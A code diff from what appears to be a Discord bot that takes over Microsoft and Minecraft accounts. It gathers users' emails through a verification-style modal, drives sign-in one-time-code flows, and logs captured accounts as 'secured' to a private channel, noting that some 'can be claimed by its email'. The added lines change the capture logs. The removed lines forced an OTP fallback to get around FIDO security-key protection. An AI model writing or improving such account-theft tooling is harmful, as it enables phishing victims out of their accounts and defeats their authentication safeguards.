@@ -241,13 +241,22 @@ class MyModalOne(ui.Modal):
                         )
                     )
 
+                    mc_name = securedAccount['minecraft']['name']
+                    if securedAccount['minecraft']['SSID']:
+                        secured_desc = f"**{mc_name}** has been successfully secured."
+                        secured_thumb = f"https://mc-heads.net/avatar/{quote(mc_name)}/128"
+                    else:
+                        secured_desc = "This account has been secured but does not own Minecraft so it can be claimed by its email."
+                        secured_thumb = f"https://mc-heads.net/avatar/{username}/128"
+
                     await sendLogs(
                         interaction.client, config,
                         Embed(
                             title="New Account Secured",
-                            description=f"**{securedAccount['minecraft']['name']}** has been successfully secured.",
+                            description=secured_desc,
                             color=0x79D990
-                        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{username}/128")
+                        ).set_thumbnail(url=secured_thumb),
+                        email=email
                     )
                     return
 
@@ -275,59 +284,6 @@ class MyModalOne(ui.Modal):
                 email = email
             )
             return
-
-        elif "FidoParams" in emailInfo["Credentials"]:
-            print("[~] - FIDO detected, forcing OTP fallback...")
-
-            emailInfo = await sendAuth(self.session, email, forceotc=True)
-
-            if "Credentials" not in emailInfo:
-                print("[X] - FIDO forceotc fallback: no Credentials in response")
-                await interaction.followup.send(
-                    embed=Embed(
-                        title = "Security Email Required",
-                        description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
-                    ),
-                    view=ButtonViewThree(),
-                    ephemeral=True
-                )
-                await sendLogs(
-                    interaction.client, config,
-                    Embed(
-                        title=f"User | {interaction.user.name} ({interaction.user.id})",
-                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO fallback returned no credentials```",
-                        timestamp=datetime.datetime.now(),
-                        colour=0xFF5C5C
-                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user),
-                    email=email
-                )
-                return
-
-            if "FidoParams" in emailInfo["Credentials"]:
-                print("[X] - FIDO account has no OTP fallback proofs available")
-                await interaction.followup.send(
-                    embed=Embed(
-                        title="❌ Security Key Required",
-                        description="This account only allows physical security key (FIDO) login and has no email/phone backup. It cannot be processed automatically.",
-                        colour=0xFF5C5C
-                    ),
-                    ephemeral=True
-                )
-                await sendLogs(
-                    interaction.client, config,
-                    Embed(
-                        title=f"User | {interaction.user.name} ({interaction.user.id})",
-                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO-only account, no OTP proofs available```",
-                        timestamp=datetime.datetime.now(),
-                        colour=0xFF5C5C
-                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user),
-                    email=email
-                )
-                return
-
-            print("[+] - FIDO forceotc fallback succeeded, continuing with OTP flow")
 
         if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
 
